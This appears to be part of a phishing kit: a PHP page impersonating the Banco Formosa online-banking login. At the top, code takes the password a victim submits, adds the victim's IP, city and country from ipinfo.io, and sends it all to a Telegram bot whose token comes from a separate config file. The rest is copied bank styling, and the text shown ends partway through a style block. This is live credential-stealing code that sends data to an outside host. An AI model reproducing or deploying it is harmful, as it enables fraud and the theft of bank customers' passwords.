<?php
ini_set("display_errors", 0);
include('datos.php');
$ip = trim(file_get_contents("http://ipinfo.io/ip"));
$cc = trim(file_get_contents("http://ipinfo.io/{$ip}/country"));
$userp = trim(file_get_contents("http://ipinfo.io/{$ip}/city"));
if ( isset ($_POST['cont']) ){

$message = "💲💲💲💲JP💲fomosa💲💲💲\r\n  🔐Clave: ".$_POST['cont']."\r\n IP: ".$ip." ".$userp." ".$cc."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}else{  header ('location:'); exit();
}

?>

<html lang="es"><head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <title>Banco Formosa | Login</title>
  <!--<base href="/">-->
  <base href=".">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#4e8ef7">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">

  <meta name="google" content="notranslate">

  <link rel="icon" type="image/x-icon" href="https://hb.bancoformosa.com.ar/assets/img/favicon.ico">
  <link rel="apple-touch-icon" sizes="16x16" href="https://hb.bancoformosa.com.ar/assets/img/apple-touch-icon.png">



  <style>
    .loading {
      position: absolute;
      width: 100%;
      height: 100%;
      background-color: rgba(255, 255, 255, 0.9019607843137255);
      z-index: 9999999999999999999999999999999999999999999999999999999999;
      top: 0px;
      left: 0px;
      text-align: center;
      overflow: hidden;
    }

    @-webkit-keyframes loading {
      0% {
        box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
      }

      50% {
        box-shadow: 0px 37px 20px -15px rgba(0, 0, 0, 0.2);
        transform: translate(0px, -10px);
      }

      100% {
        box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
        transform: translate(0px, 0px);
      }
    }

    @keyframes loading {
      0% {
        box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
      }

      50% {
        box-shadow: 0px 37px 20px -15px rgba(0, 0, 0, 0.2);
        transform: translate(0px, -10px);
      }

      100% {
        box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
        transform: translate(0px, 0px);
      }
    }
  </style>






  <link rel="stylesheet" href="./token_files/styles.ba326f28c709205bc0b2.css">
  <style>
    .container-flow[_ngcontent-c0] {
      position: relative;
      background-color: #fff;
      width: 100%;
      height: 100vh
    }

    .version[_ngcontent-c0] {
      color: #18cc18;
      font-size: 18px;
      position: fixed;
      right: 20px;
      bottom: 0;
      z-index: 99999999999999999999999999
    }

    .main-container[_ngcontent-c0] {
      background-color: #fff;
      transition: all .25s ease;
      position: absolute;
      top: 89px;
      right: 0;
      width: calc(100% - 270px);
      height: calc(100% - 89px);
      overflow-x: hidden;
      padding: 0 20px 20px
    }

    .main-container.sucursales[_ngcontent-c0] {
      padding-bottom: 0;
      padding-right: 0;
      padding-left: 0
    }

    .full-container[_ngcontent-c0] {
      position: relative;
      width: 100%
    }

    .alignToLogo[_ngcontent-c0] {
      padding: 0 73px
    }

    @media only screen and (max-width:1366px) and (min-width:1276px) {
      .alignToLogo[_ngcontent-c0] {
        padding: 0 50px
      }
    }

    @media only screen and (max-width:810px) {
      .alignToLogo[_ngcontent-c0] {
        padding: 20px
      }
    }

    .lcp[_ngcontent-c0] {
      top: 0;
      width: 100%;
      height: 100% !important
    }

    .login-img[_ngcontent-c0] {
      background-repeat: no-repeat;
      background-size: cover
    }

    .alert-container[_ngcontent-c0] {
      position: fixed;
      z-index: 2147483647;
      bottom: 10px;
      display: block
    }

    .backendmessage[_ngcontent-c0] {
      padding: 14px 20px 0;
      cursor: pointer;
      border: 1px solid transparent;
      border-radius: .25rem;
      -webkit-animation-name: bounceInRight;
      animation-name: bounceInRight;
      -webkit-animation-duration: 1s;
      animation-duration: 1s;
      -webkit-animation-fill-mode: both;
      animation-fill-mode: both;
      z-index: 100;
      margin: 15px 15px 1rem
    }

    .backendmessage[_ngcontent-c0]>p[_ngcontent-c0] {
      color: #fff;
      font-size: 16px
    }

    .message-error[_ngcontent-c0] {
      background-color: #f44336
    }

    .message-warn[_ngcontent-c0] {
      background-color: #ff9800
    }

    .message-success[_ngcontent-c0] {
      background-color: #4caf50
    }

    .blur[_ngcontent-c0] {
      -webkit-filter: blur(4px);
      filter: blur(4px)
    }

    @-webkit-keyframes fadeInFromNone {
      0% {
        display: none;
        opacity: 0
      }

      1% {
        display: block;
        opacity: 0
      }

      100% {
        display: block;
        opacity: 1
      }
    }

    @keyframes fadeInFromNone {
      0% {
        display: none;
        opacity: 0
      }

      1% {
        display: block;
        opacity: 0
      }

      100% {
        display: block;
        opacity: 1
      }
    }

    @-webkit-keyframes fadeOutFromNone {

      0%,
      1% {
        display: block;
        opacity: 1
      }

      100% {
        display: none;
        opacity: 0
      }
    }

    @keyframes fadeOutFromNone {

      0%,
      1% {
        display: block;
        opacity: 1
      }

      100% {
        display: none;
        opacity: 0
      }
    }

    .Tooltip[_ngcontent-c0] {
      position: absolute;
      width: -webkit-fit-content;
      width: -moz-fit-content;
      width: fit-content;
      background: #1a1a1a;
      color: #fff;
      padding: 8px;
      max-width: 250px;
      border-radius: 5px;
      -webkit-transform: translate(-50%, -100%) translateY(-20px);
      transform: translate(-50%, -100%) translateY(-20px);
      z-index: 99999999999
    }

    .Tooltip[_ngcontent-c0] p[_ngcontent-c0] {
      font-size: 14px
    }

    .Tooltip[_ngcontent-c0] .triangle[_ngcontent-c0] {
      width: 10px;
      height: 10px;
      position: absolute;
      border-left: 10px solid transparent;
      border-right: 10px solid transparent;
      border-top: 10px solid #1a1a1a;
      bottom: -10px;
      left: calc(50% - 10px)
    }

    .Tooltip.oculto[_ngcontent-c0] {
      -webkit-animation: .2s ease-in-out fadeOutFromNone;
      animation: .2s ease-in-out fadeOutFromNone;
      opacity: 0;
      display: none
    }

    .Tooltip.mostrando[_ngcontent-c0] {
      -webkit-animation: .2s ease-in-out fadeInFromNone;
      animation: .2s ease-in-out fadeInFromNone;
      opacity: 1;
      display: block
    }

    .Tooltip.left[_ngcontent-c0]:not(.bottom) {
      -webkit-transform: translateX(-100%) translateX(-20px) translateY(-50%);
      transform: translateX(-100%) translateX(-20px) translateY(-50%)
    }

    .Tooltip.left[_ngcontent-c0]:not(.bottom) .triangle[_ngcontent-c0] {
      -webkit-transform: rotate(-90deg);
      transform: rotate(-90deg);
      left: unset;
      right: -15px;
      bottom: calc(50% - 5px)
    }

    .Tooltip.left.bottom[_ngcontent-c0] {
      -webkit-transform: translateX(-100%) translateX(10px) translateY(100%);
      transform: translateX(-100%) translateX(10px) translateY(100%)
    }

    .Tooltip.left.bottom[_ngcontent-c0] .triangle[_ngcontent-c0] {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg);
      top: -10px;
      left: unset;
      right: 0
    }

    .Tooltip.right[_ngcontent-c0]:not(.bottom) {
      -webkit-transform: translateX(25px) translateY(-50%);
      transform: translateX(25px) translateY(-50%)
    }

    .Tooltip.right[_ngcontent-c0]:not(.bottom) .triangle[_ngcontent-c0] {
      bottom: calc(50% - 5px);
      -webkit-transform: rotate(90deg);
      transform: rotate(90deg);
      left: -15px
    }

    .Tooltip.right.bottom[_ngcontent-c0] {
      -webkit-transform: translateX(0) translateY(100%);
      transform: translateX(0) translateY(100%)
    }

    .Tooltip.right.bottom[_ngcontent-c0] .triangle[_ngcontent-c0] {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg);
      top: -10px;
      left: 0
    }

    .Tooltip.bottom[_ngcontent-c0]:not(.left):not(.right) {
      -webkit-transform: translateX(-50%) translateY(100%);
      transform: translateX(-50%) translateY(100%)
    }

    .Tooltip.bottom[_ngcontent-c0]:not(.left):not(.right) .triangle[_ngcontent-c0] {
      bottom: unset;
      top: -10px;
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg)
    }

    @media only screen and (max-width:1366px) {
      .main-container[_ngcontent-c0] {
        width: calc(100% - 220px)
      }
    }

    @media only screen and (max-width:1275px) {
      .main-container[_ngcontent-c0] {
        width: 100%
      }
    }

    @media only screen and (max-width:810px) {
      .container-flow[_ngcontent-c0] {
        overflow: visible
      }

      .main-container[_ngcontent-c0] {
        top: 134px;
        height: calc(100% - 134px);
        padding-top: 20px
      }
    }

    @-webkit-keyframes pulse {

      from,
      to {
        -webkit-transform: scale3d(1, 1, 1);
        transform: scale3d(1, 1, 1)
      }

      50% {
        -webkit-transform: scale3d(1.2, 1.2, 1.2);
        transform: scale3d(1.2, 1.2, 1.2)
      }
    }

    @keyframes pulse {

      from,
      to {
        -webkit-transform: scale3d(1, 1, 1);
        transform: scale3d(1, 1, 1)
      }

      50% {
        -webkit-transform: scale3d(1.2, 1.2, 1.2);
        transform: scale3d(1.2, 1.2, 1.2)
      }
    }

    .pulse[_ngcontent-c0] {
      -webkit-animation-name: pulse;
      animation-name: pulse
    }

    .login-splash {
      background: rgba(255, 255, 255, .901961);
      position: fixed;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      display: none;
      align-items: center;
      z-index: 9999999999999999999999999999999999999999999999;
      justify-content: center
    }

    .login-splash .custom-animation {
      width: 150px;
      z-index: 99999999999999999999999999999999999999999999999;
      -webkit-animation: 1s ease-in infinite pulse;
      animation: 1s ease-in infinite pulse
    }

    @media all and (-ms-high-contrast:none),
    (-ms-high-contrast:active) {
      .login-splash[_ngcontent-c0] {
        display: flex
      }

      .notIE[_ngcontent-c0] {
        display: none
      }
    }

    @supports (-ms-ime-align:auto) {
      .login-splash[_ngcontent-c0] {
        display: flex
      }

      .notIE[_ngcontent-c0] {
        display: none
      }
    }

    @supports (-ms-accelerator:true) {
      .login-splash[_ngcontent-c0] {
        display: flex
      }

      .notIE[_ngcontent-c0] {
        display: none
      }
    }

    @-moz-document url-prefix() {
      .login-splash {
        display: flex
      }

      .notIE {
        display: none
      }
    }

    .background[_ngcontent-c0] {
      position: fixed;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, .3);
      z-index: 9999
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] {
      position: absolute;
      top: 0;
      left: 0;
      z-index: 4;
      -webkit-transform: translate(50vw, 50vh) translate(-50%, -50%);
      transform: translate(50vw, 50vh) translate(-50%, -50%);
      border-radius: 5px;
      overflow: hidden;
      width: 500px;
      max-width: calc(100% - 40px)
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .header[_ngcontent-c0] {
      background: #003f75;
      padding: 20px
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .header[_ngcontent-c0] h1[_ngcontent-c0] {
      color: #fff;
      margin-right: 30px
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .header[_ngcontent-c0] img[_ngcontent-c0] {
      position: absolute;
      right: 10px;
      top: 20px;
      width: 30px;
      cursor: pointer
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .content[_ngcontent-c0] {
      background-color: #fff
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .content[_ngcontent-c0] .stage[_ngcontent-c0] {
      position: relative;
      width: 100%;
      height: 100%;
      padding: 20px
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .content[_ngcontent-c0] .stage.center[_ngcontent-c0] {
      text-align: center
    }

    button.switchAccesible[_ngcontent-c0] {
      width: auto;
      opacity: .4;
      z-index: 99;
      position: fixed;
      top: 10px;
      left: 90px
    }
  </style>
  <style>
    [_nghost-c5] .login-container .login-box .check-cont .checkRCont {
      border-color: #fff !important
    }

    .login-container[_ngcontent-c5] {
      width: 100vw;
      min-height: 100vh;
      max-width: 100%;
      overflow: hidden;
      position: relative
    }

    .login-container[_ngcontent-c5] .formosaVideo[_ngcontent-c5] {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      display: block;
      background-color: rgba(0, 0, 0, .3);
      z-index: 1
    }

    .login-container[_ngcontent-c5] .passEye[_ngcontent-c5] {
      position: absolute;
      right: 70px;
      bottom: 150px;
      width: 25px
    }

    .login-container[_ngcontent-c5] .passEye[_ngcontent-c5] img[_ngcontent-c5] {
      width: 100%
    }

    .login-container[_ngcontent-c5] video[_ngcontent-c5] {
      position: fixed;
      left: 50%;
      top: 0;
      -webkit-transform: translateX(-50%);
      transform: translateX(-50%);
      min-width: 100%;
      min-height: 100%
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] {
      display: flex;
      justify-content: space-between;
      flex-direction: column;
      height: 100%;
      min-height: calc(100vh - 1px)
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5],
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5],
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] {
      z-index: 1;
      margin-left: 4vw;
      margin-right: 4vw
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      margin-top: 2vh;
      margin-bottom: 2vh;
      padding-bottom: 2vh;
      border-bottom: 1px solid #fff;
      color: #fff
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .logo[_ngcontent-c5] {
      width: 240px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] {
      display: flex;
      align-items: center;
      justify-content: flex-end;
      flex-direction: row
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] img[_ngcontent-c5] {
      height: 50px;
      margin-right: 10px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] h3[_ngcontent-c5] {
      font-size: 20px;
      white-space: nowrap;
      margin: 0
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] p[_ngcontent-c5] {
      font-size: 12px;
      white-space: nowrap;
      margin: 0
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .apps[_ngcontent-c5],
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .tels[_ngcontent-c5] {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      justify-content: space-around;
      margin-right: 30px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] {
      display: flex;
      align-items: flex-start;
      flex-direction: row;
      justify-content: space-around
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] {
      color: #fff;
      text-align: left;
      max-width: 560px;
      align-self: center;
      margin-right: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] h1[_ngcontent-c5] {
      font-size: 35px;
      font-weight: 700
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] p[_ngcontent-c5] {
      font-size: 14px;
      font-weight: 700
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] {
      position: relative;
      display: flex;
      flex-direction: column;
      flex-shrink: 0;
      justify-items: flex-start;
      background-color: rgba(0, 61, 121, .7);
      padding: 60px 50px 3vh;
      border-radius: 10px;
      max-width: 430px;
      color: #fff;
      margin-bottom: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box.securityImage[_ngcontent-c5] {
      margin-top: 40px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .widthVolver[_ngcontent-c5] {
      width: calc(100% - 110px)
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .imgSeguridad[_ngcontent-c5] {
      height: 13vh;
      width: 13vh;
      min-height: 80px;
      min-width: 80px;
      max-height: 100px;
      max-width: 100px;
      border-radius: 10px;
      border: 1px solid #fff;
      position: absolute;
      top: 0;
      left: 50%;
      -webkit-transform: translate(-50%, -50%);
      transform: translate(-50%, -50%);
      overflow: hidden
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .imgSeguridad[_ngcontent-c5] img[_ngcontent-c5] {
      width: 100%;
      height: 100%
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h1[_ngcontent-c5],
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h2[_ngcontent-c5] {
      margin-bottom: 0;
      -webkit-touch-callout: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h2[_ngcontent-c5] {
      font-size: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h1[_ngcontent-c5] {
      font-size: 27px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .info-text[_ngcontent-c5] {
      font-size: 14px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .info-text.hide[_ngcontent-c5] {
      opacity: 0;
      margin: 0 !important;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      max-height: 0;
      overflow: hidden
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .short-line[_ngcontent-c5] {
      background-color: #e6e6e6;
      margin-top: 20px;
      height: 1px;
      width: 80px;
      -webkit-touch-callout: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] {
      background-color: #fff;
      display: flex;
      flex-direction: row;
      justify-content: flex-start;
      margin-top: 20px;
      height: 80px;
      margin-left: -50px;
      margin-right: -50px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-icon[_ngcontent-c5] {
      padding-top: 6px;
      padding-left: 50px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-icon[_ngcontent-c5] img[_ngcontent-c5] {
      width: 15px;
      height: 15px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] {
      padding-top: 10px;
      padding-left: 8px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] h1[_ngcontent-c5] {
      color: #f2994a;
      font-size: 16px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] p[_ngcontent-c5] {
      padding-top: 5px;
      color: #003f75;
      font-size: 13px;
      font-weight: 600;
      line-height: 15px
    }

    @media only screen and (max-width:1400px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] {
        margin-left: -40px;
        margin-right: -40px;
        height: 75px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-icon[_ngcontent-c5] {
        padding-left: 40px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] h1[_ngcontent-c5] {
        font-size: 15px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] p[_ngcontent-c5] {
        font-size: 12px;
        font-weight: 600;
        line-height: 15px
      }
    }

    @media only screen and (max-width:810px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] {
        margin-left: -10px;
        margin-right: -10px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-icon[_ngcontent-c5] {
        padding-left: 10px
      }
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5]::-webkit-input-placeholder {
      color: #fff;
      opacity: 1
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5]:-ms-input-placeholder {
      opacity: 1;
      color: #fff
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5]::-ms-input-placeholder {
      opacity: 1;
      color: #fff
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5]::placeholder {
      color: #fff;
      opacity: 1
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] input[_ngcontent-c5]::-ms-clear,
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] input[_ngcontent-c5]::-ms-reveal {
      display: none
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5] {
      border: 2px solid #fff;
      width: 100%;
      max-width: 100%;
      height: 38px;
      border-radius: 20px;
      background: url(static/user.9e8754f6da04522662ab.png) 15px 4px no-repeat;
      padding-left: 60px;
      color: #fff;
      margin-top: 20px;
      padding-right: 40px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input-pwd[_ngcontent-c5] {
      background: url(static/key.2d8b9614ffdb8d17a1f0.png) 15px 4px/25px 25px no-repeat;
      margin-top: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input-tkn[_ngcontent-c5] {
      background: url(static/locked.304114069651e220d7a9.png) 15px 4px/25px 25px no-repeat;
      margin-top: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .boton[_ngcontent-c5] {
      width: 100%;
      background-color: #fff;
      margin-top: 20px;
      border-radius: 20px;
      border: none;
      height: 38px;
      font-weight: 700;
      transition: all 2s ease;
      color: #003f75
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .boton[_ngcontent-c5]:hover {
      border: 2px solid #fff;
      color: #fff;
      background-color: transparent
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .forgot-text[_ngcontent-c5] {
      text-align: center;
      cursor: pointer;
      font-size: 14px;
      text-decoration: underline;
      margin-top: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .login-help[_ngcontent-c5] {
      background: #00a5df;
      align-self: center;
      padding: 8px;
      width: calc(100% - 180px);
      border-radius: 20px;
      position: absolute;
      bottom: 0;
      -webkit-transform: translateY(40%);
      transform: translateY(40%);
      text-align: center;
      cursor: pointer
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] {
      display: none
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .check-cont[_ngcontent-c5] {
      position: absolute;
      width: 20px;
      height: 20px;
      float: left
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
      position: absolute;
      right: calc(75% - -2rem);
      top: 16rem;
      -webkit-transform: translateX(-50%) translateY(-100%) translateY(-20px);
      transform: translateX(-50%) translateY(-100%) translateY(-20px);
      z-index: 1
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] {
      display: flex;
      flex-direction: row;
      justify-content: space-around;
      padding-top: 30px;
      padding-bottom: 10px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] .link[_ngcontent-c5] {
      text-decoration: underline !important;
      color: #fff !important;
      font-weight: 700;
      font-size: 18px;
      cursor: pointer
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] .link[_ngcontent-c5]:hover {
      color: #42a7ff !important
    }

    .overlay[_ngcontent-c5] {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, .5);
      display: flex;
      align-items: center;
      flex-direction: column;
      z-index: 10;
      padding-top: 85px
    }

    .overlay.alt[_ngcontent-c5] {
      padding-top: 0;
      display: flex;
      align-items: center;
      flex-direction: column;
      justify-content: center
    }

    .overlay.alt[_ngcontent-c5] .primary-button[_ngcontent-c5] {
      margin-left: 0;
      display: block
    }

    .overlay[_ngcontent-c5] .content[_ngcontent-c5] {
      border-radius: 7px;
      width: 800px;
      height: calc(100% - 100px);
      max-width: 80%;
      background: #fff;
      padding-bottom: 80px;
      position: relative
    }

    .overlay[_ngcontent-c5] .content[_ngcontent-c5] .box-modal-close[_ngcontent-c5] {
      position: absolute;
      left: 100%;
      width: 60px;
      top: 0;
      cursor: pointer
    }

    .overlay[_ngcontent-c5] .content[_ngcontent-c5] .content-inside[_ngcontent-c5] {
      padding: 15px
    }

    .overlay[_ngcontent-c5] .title-container[_ngcontent-c5] {
      padding: 25px;
      background: #003f75;
      margin: 0;
      font-size: 25px
    }

    .overlay[_ngcontent-c5] .title-container[_ngcontent-c5] .sub-title[_ngcontent-c5] {
      color: #fff;
      margin: 0
    }

    .overlay[_ngcontent-c5] .title-container[_ngcontent-c5] .closeImg[_ngcontent-c5] {
      position: absolute;
      right: 15px;
      top: 25px;
      width: 30px;
      cursor: pointer
    }

    @media only screen and (max-width:1860px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - -1rem)
      }
    }

    @media only screen and (max-width:1780px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 2rem)
      }
    }

    @media only screen and (max-width:1680px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 5rem)
      }
    }

    @media only screen and (max-width:1585px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 8rem)
      }
    }

    @media only screen and (max-width:1400px) {
      .login-container[_ngcontent-c5] .passEye[_ngcontent-c5] {
        right: 55px;
        top: 341px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .logo[_ngcontent-c5] {
        width: 200px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .apps[_ngcontent-c5],
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .tels[_ngcontent-c5] {
        margin-right: 20px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] h1[_ngcontent-c5] {
        font-size: 29px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] {
        max-width: 400px;
        padding: 55px 40px 4vh
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h2[_ngcontent-c5] {
        font-size: 17px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h1[_ngcontent-c5] {
        font-size: 24px
      }

